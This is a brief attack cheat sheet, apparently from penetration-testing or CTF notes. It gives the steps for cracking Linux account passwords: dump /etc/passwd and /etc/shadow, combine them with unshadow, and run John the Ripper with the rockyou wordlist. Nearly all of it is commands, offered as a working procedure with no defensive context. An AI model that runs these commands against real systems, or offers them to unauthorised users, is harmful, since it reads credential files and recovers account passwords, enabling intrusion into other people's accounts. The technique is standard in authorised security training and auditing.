If you have access to the /etc/shadow and /etc/passwd files you can try to crack those hashes.

save the output from both into a text file
```bash
cat /etc/passwd
cat /etc/shadow
```

Then on your machine save the output from this command into A THIRD TEXT FILE
```bash
unshadow passwd.txt shadow.txt
```

Lastly, ( you may need to format it, depends)
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
